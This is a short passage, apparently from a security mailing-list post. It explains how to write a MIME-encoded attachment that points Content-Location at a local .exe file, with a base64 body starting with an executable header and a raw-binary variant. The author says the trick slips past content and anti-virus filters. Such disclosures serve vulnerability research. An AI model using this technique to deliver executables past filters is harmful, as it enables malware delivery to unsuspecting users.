<!-- 

Step 2: Now create a text file that will be used to hold the MIME 
encoded attachment. Start notepad (or another text editor), and 
paste 
in: 


     MIME-Version: 1.0 
     Content-Location:file:///executable.exe 
     Content-Transfer-Encoding: base64 


     TVp0AQIAAAAgAAgA//8YAIAAAAAQAAIAHgAAAAEAAAAAA 
     AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

That's a very interesting situation with content filters and anti-
virus filters. How many others are affected one must wonder.

Try the following as well, nothing more than pure binary:

MIME-Version: 1.0
Content-Location:File://foo.exe
Content-Transfer-Encoding: binary

Lot more where that came from.
